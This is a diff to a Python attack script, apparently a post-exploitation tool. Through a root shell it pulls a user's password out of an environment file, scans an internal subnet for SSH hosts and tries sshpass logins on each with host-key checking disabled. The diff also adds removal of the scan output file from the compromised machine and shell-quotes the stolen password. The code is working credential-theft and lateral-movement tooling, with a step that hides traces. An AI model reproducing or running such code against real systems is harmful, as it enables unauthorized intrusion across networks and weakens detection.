@@ -1,4 +1,5 @@
 import re
+import shlex
 import socket
 import time
 
@@ -127,7 +128,7 @@ def run(root_shell, subnet=INTERNAL_SUBNET, target_user=TARGET_USERNAME):
     if not password:
         print(f"[-] No usable password variable found in {ENV_FILE_PATH}")
         print(f"[?] File contents: {env_blob!r}")
-        return None
+        return {"john_ip": None, "john_password": None, "scanned_hosts": [], "successes": []}
     print(f"[+] Recovered credential: {target_user} / {password}")
 
     # ------------------------------------------------------------------
@@ -143,7 +144,8 @@ def run(root_shell, subnet=INTERNAL_SUBNET, target_user=TARGET_USERNAME):
     discovered = [ip for ip in _parse_gnmap_hosts(scan_out) if ip not in _SKIP_HOSTS]
     if not discovered:
         print(f"[-] No SSH hosts discovered on {subnet}")
-        return None
+        _run_remote(root_shell, f"rm -f {SCAN_OUTPUT_FILE}")
+        return {"john_ip": None, "john_password": password, "scanned_hosts": [], "successes": []}
     print(f"[+] Discovered {len(discovered)} live SSH host(s): {', '.join(discovered)}")
 
     # ------------------------------------------------------------------
@@ -153,7 +155,7 @@ def run(root_shell, subnet=INTERNAL_SUBNET, target_user=TARGET_USERNAME):
     successes = []
     for host in discovered:
         attempt = (
-            f"sshpass -p '{password}' ssh "
+            f"sshpass -p {shlex.quote(password)} ssh "
             f"-o StrictHostKeyChecking=accept-new "
             f"-o UserKnownHostsFile=/dev/null "
             f"-o PasswordAuthentication=yes "
